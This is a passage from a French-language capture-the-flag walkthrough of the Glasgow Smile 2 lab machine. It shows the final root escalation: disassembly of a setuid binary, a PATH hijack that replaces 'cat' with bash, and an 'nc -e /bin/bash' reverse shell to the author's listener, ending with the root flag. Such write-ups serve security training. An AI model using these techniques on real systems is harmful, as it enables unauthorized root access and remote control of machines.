    1146:       48 89 e5                mov    %rsp,%rbp
    1149:       bf 00 00 00 00          mov    $0x0,%edi
    114e:       e8 ed fe ff ff          callq  1040 <setuid@plt>
    1153:       bf 00 00 00 00          mov    $0x0,%edi
    1158:       e8 d3 fe ff ff          callq  1030 <setgid@plt>
    115d:       90                      nop
    115e:       5d                      pop    %rbp
    115f:       c3                      retq
```

Seul le numéro 4 exécute vraiment quelque chose :

```console
venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ objdump -d gothamwillburn4 | grep -A10 '<main>:'
0000000000001155 <main>:
    1155:       55                      push   %rbp
    1156:       48 89 e5                mov    %rsp,%rbp
    1159:       bf 00 00 00 00          mov    $0x0,%edi
    115e:       e8 ed fe ff ff          callq  1050 <setuid@plt>
    1163:       bf 00 00 00 00          mov    $0x0,%edi
    1168:       e8 d3 fe ff ff          callq  1040 <setgid@plt>
    116d:       48 8d 3d 90 0e 00 00    lea    0xe90(%rip),%rdi        # 2004 <_IO_stdin_used+0x4>
    1174:       b8 00 00 00 00          mov    $0x0,%eax
    1179:       e8 b2 fe ff ff          callq  1030 <system@plt>
    117e:       90                      nop
```

Quand on l'exécute on comprend qui fait un `cat batman` après avoir mis l'UID à 0 :

```console
venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ ./gothamwillburn4
  ____    _  _____ __  __    _    _   _  __   _____  _   _    ____  ___  _   _ _   _    _      ____ ___ _____ _ 
 | __ )  / \|_   _|  \/  |  / \  | \ | | \ \ / / _ \| | | |  / ___|/ _ \| \ | | \ | |  / \    |  _ \_ _| ____| |
 |  _ \ / _ \ | | | |\/| | / _ \ |  \| |  \ V / | | | | | | | |  _| | | |  \| |  \| | / _ \   | | | | ||  _| | |
 | |_) / ___ \| | | |  | |/ ___ \| |\  |   | || |_| | |_| | | |_| | |_| | |\  | |\  |/ ___ \  | |_| | || |___|_|
 |____/_/   \_\_| |_|  |_/_/ _ \_\_| \_|   |_| \___/_\___/   \____|\___/|_| \_|_| \_/_/   \_\ |____/___|_____(_)
                            / \  | | | |  / \  | | | |  / \  | | | |  / \  | |                                  
                           / _ \ | |_| | / _ \ | |_| | / _ \ | |_| | / _ \ | |                                  
                          / ___ \|  _  |/ ___ \|  _  |/ ___ \|  _  |/ ___ \|_|                                  
                         /_/   \_\_| |_/_/   \_\_| |_/_/   \_\_| |_/_/   \_(_)
```

On est dans les mêmes conditions que tout à l'heure, à savoir les fichiers ne nous appartiennent pas (root) mais on possède le dossier.

```console
venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ rm batman 
rm: remove write-protected regular file 'batman'? y
venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ cp /bin/bash cat
venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ echo "nc -e /bin/bash 192.168.56.1 7777" > batman
venom@glasgowsmile2:~/Ladies_and_Gentlmen/Gotham$ PATH=.:$PATH ./gothamwillburn4
```

J'obtiens alors mon shell root et le flag final :

```console
$ nc -l -p 7777 -v
Listening on 0.0.0.0 7777
Connection received on 192.168.56.226 54070
id
uid=0(root) gid=0(root) groups=0(root),1002(venom)
cd /root
ls
root.txt
task.sh
cat root.txt
      ....        .         ..                .x+=:.                                                     ...                                .          ..                           
   .x88" `^x~  xH(`   x .d88"                z`    ^%                            x=~                 .x888888hx    :                       @88>  x .d88"               .--~*teu.    
  X888   x8 ` 8888h    5888R                    .   <k                    u.    88x.   .e.   .e.    d88888888888hxx     ..    .     :      %8P    5888R               dF     988Nx  
 88888  888.  %8888    '888R         u        .@8Ned8"      uL      ...ue888b  '8888X.x888:.x888   8" ... `"*8888%`   .888: x888  x888.     .     '888R        .u    d888b   `8888> 
<8888X X8888   X8?      888R      us888u.   .@^%8888"   .ue888Nc..  888R Y888r  `8888  888X '888k !  "   ` .xnxx.    ~`8888~'888X`?888f`  .@88u    888R     ud8888.  ?8888>  98888F 
X8888> 488888>"8888x    888R   .@88 "8888" x88:  `)8b. d88E`"888E`  888R I888>   X888  888X  888X X X   .H8888888%:    X888  888X '888>  ''888E`   888R   :888'8888.  "**"  x88888~ 
X8888>  888888 '8888L   888R   9888  9888  8888N=*8888 888E  888E   888R I888>   X888  888X  888X X 'hn8888888*"   >   X888  888X '888>    888E    888R   d888 '88%"       d8888*`  
?8888X   ?8888>'8888X   888R   9888  9888   %8"    R88 888E  888E   888R I888>   X888  888X  888X X: `*88888%`     !   X888  888X '888>    888E    888R   8888.+"        z8**"`   : 
 8888X h  8888 '8888~   888R   9888  9888    @8Wou 9%  888E  888E  u8888cJ888   .X888  888X. 888~ '8h.. ``     ..x8>   X888  888X '888>    888E    888R   8888L        :?.....  ..F 
  ?888  -:8*"  <888"   .888B . 9888  9888  .888888P`   888& .888E   "*888*P"    `%88%``"*888Y"     `88888888888888f   "*88%""*88" '888!`   888&   .888B . '8888c. .+  <""888888888~ 
   `*88.      :88%     ^*888%  "888*""888" `   ^"F     *888" 888&     'Y"         `~     `"         '%8888888888*"      `~    "    `"`     R888"  ^*888%   "88888%    8:  "888888*  
      ^"~====""`         "%     ^Y"   ^Y'               `"   "888E                                     ^"****""`                            ""      "%       "YP'     ""    "**"`   
                                                       .dWi   `88E                                                                                                                  
                                                       4888~  J8%                                                                                                                   
                                                        ^"===*"`                                                                                                                    
                                                                     

What do you get when you cross a mentally-ill loner with a society that abandons him and treats him like trash!? 
I'll tell you what you get:

YOU GET WHAT YOU FUCKING DESERVE!


Congratulations you pwned GS2!

GS2{df135baa6a216b6fe05f57a1efc1c90f}

If you liked my Virtual Machines, offer me a coffee, I'll work on the next one!

https://www.buymeacoffee.com/mindsflee

mindsflee
```
